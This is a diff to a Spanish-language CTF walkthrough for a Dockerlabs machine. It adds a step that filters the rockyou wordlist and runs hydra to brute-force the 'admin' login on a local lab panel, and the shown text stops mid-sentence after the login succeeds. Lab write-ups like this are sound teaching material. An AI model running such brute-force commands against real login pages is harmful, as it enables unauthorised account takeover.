@@ -86,3 +86,16 @@ Accediendo desde el navegador podemos comprobar que se trata de un panel de logi
       awk 'length($0)>=10 && $0~/[A-Z]/ && $0~/[a-z]/ && $0~/[0-9]/' /usr/share/wordlists/rockyou.txt > rockyou.txt2
     </code>
   </pre>
+
+  Bien ahora haremos fuerza bruta al panel de login con el nuevo diccionario.
+
+  <pre>
+    <code>
+      
+┌──(root㉿kali)-[/home/kali/Dockerlabs]
+└─# hydra -l admin -P rockyou.txt2 172.17.0.3 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid credentials."
+
+    </code>
+  </pre>
+
+De esta forma conseguimos las credenciales para poder loguearnos en el panel de login. Una vez nos logueamos 
